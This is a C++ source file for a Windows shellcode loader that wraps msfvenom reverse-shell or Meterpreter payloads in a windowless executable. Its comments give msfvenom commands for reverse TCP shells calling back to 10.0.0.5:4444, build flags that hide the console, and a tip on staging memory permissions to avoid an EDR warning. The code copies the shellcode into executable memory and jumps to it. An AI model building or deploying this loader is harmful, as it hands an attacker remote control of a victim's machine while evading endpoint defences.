// revshell_sc.cpp — shellcode-wrapping EXE (msfvenom-generated reverse shell)
//
// Paste shellcode from msfvenom into the `shellcode[]` array below, rebuild.
// This is more flexible than revshell_pure.cpp (works with Meterpreter,
// encoders, encrypted stagers) but opaque - you can't audit the exact
// instructions.
//
// Generate shellcode:
//   msfvenom -p windows/x64/shell_reverse_tcp \
//            LHOST=10.0.0.5 LPORT=4444 \
//            -f c -b '\x00\x0a\x0d'
//
// Or Meterpreter:
//   msfvenom -p windows/x64/meterpreter/reverse_tcp \
//            LHOST=10.0.0.5 LPORT=4444 \
//            -f c
//
// Build (MSVC):
//   cl /EHsc /O2 /nologo revshell_sc.cpp /link /SUBSYSTEM:WINDOWS /Fe:revshell_sc.exe
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -O2 -s -mwindows -o revshell_sc.exe revshell_sc.cpp

#include <windows.h>
#include <string.h>

// ===========================================================================
// PASTE MSFVENOM OUTPUT BELOW (replace the stub).
// ===========================================================================
unsigned char shellcode[] =
    // ---- replace from here ----
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    // ... (truncated placeholder - replace with the full msfvenom buf[])
    "\xc3"
    // ---- replace up to here ----
    ;

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SIZE_T len = sizeof(shellcode) - 1;

    // Allocate RWX page. For a more realistic chain:
    //   1. VirtualAlloc with PAGE_READWRITE
    //   2. memcpy
    //   3. VirtualProtect to PAGE_EXECUTE_READ
    // This two-step avoids the "W+X" red flag some EDRs raise.
    void* mem = VirtualAlloc(nullptr, len,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;

    memcpy(mem, shellcode, len);

    // Jump to shellcode via function pointer cast
    ((void(*)())mem)();

    // Not reached unless shellcode returns cleanly
    return 0;
}
